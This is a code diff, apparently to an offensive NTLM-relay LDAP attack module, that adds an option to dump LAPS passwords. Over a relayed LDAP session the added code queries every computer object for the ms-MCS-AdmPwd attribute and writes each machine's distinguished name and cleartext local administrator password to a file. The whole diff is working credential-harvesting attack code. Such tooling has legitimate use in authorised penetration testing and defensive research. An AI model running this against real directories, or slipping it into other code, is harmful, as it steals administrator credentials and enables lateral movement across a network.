@@ -578,6 +578,30 @@ class LDAPAttack(ProtocolAttack):
                 LOG.error('Cannot perform ACL escalation because we do not have create user '\
                           'privileges. Specify a user to assign privileges to with --escalate-user')
 
+        # Dump LAPS Passwords
+        if self.config.dumplaps:
+            LOG.info("Attempting to dump LAPS passwords")
+
+            success = self.client.search(domainDumper.root, '(&(objectCategory=computer))', search_scope=ldap3.SUBTREE, attributes=['DistinguishedName','ms-MCS-AdmPwd'])
+            
+            if success:
+
+                fd = open("laps-dump-" + self.username, "w+")
+                for entry in self.client.response:
+                    try:
+                        dn = "DN:" + entry['attributes']['distinguishedname']
+                        passwd = "Password:" + entry['attributes']['ms-MCS-AdmPwd']
+
+                        LOG.debug(dn)
+                        LOG.debug(passwd)
+
+                        fd.write(dn)
+                        fd.write("\n")
+                        fd.write(passwd)
+                        fd.write("\n")
+                    except:
+                        continue
+
         # Perform the Delegate attack if it is enabled and we relayed a computer account
         if self.config.delegateaccess and self.username[-1] == '$':
             self.delegateAttack(self.config.escalateuser, self.username, domainDumper, self.config.sid)
